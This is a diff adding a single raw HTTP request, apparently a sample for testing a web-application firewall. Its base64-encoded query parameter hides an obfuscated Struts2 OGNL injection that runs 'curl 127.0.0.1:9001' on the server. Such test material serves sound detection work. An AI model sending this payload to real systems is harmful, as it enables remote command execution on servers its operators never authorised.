@@ -1,0 +1,13 @@
+GET /utilization/ellipsis/indecisive?bogus=mechanism&intrusive=position&retain=KCNjb250ZXh0PSNhdHRyWydceDczJysnXHg3NCcrJ1x4NzInKydceDc1JysnXHg3NCcrJ1x4NzMnKydceDJlJysnXHg3NicrJ1x4NjEnKydceDZjJysnXHg3NScrJ1x4NjUnKydceDUzJysnXHg3NCcrJ1x4NjEnKydceDYzJysnXHg2YicgXS5jb250ZXh0KS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKEBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykpLihAamF2YS5sYW5nLlJ1bnRpbWVAZ2V0UnVudGltZSgpLmV4ZWMoJ1x4NjMnKydceDc1JysnXHg3MicrJ1x4NmMnKydceDIwJysnXHgzMScrJ1x4MzInKydceDM3JysnXHgyZScrJ1x4MzAnKydceDJlJysnXHgzMCcrJ1x4MmUnKydceDMxJysnXHgzYScrJ1x4MzknKydceDMwJysnXHgzMCcrJ1x4MzEnICkp HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+Cookie: explicit=incident; pong=module; SESSIONID=ab25ed2a68086d341762637546e099cd0a6564f1deff5d9cf1a056b6ba68ecbaa5691ff11b778356650a8a02bbf30e14
+
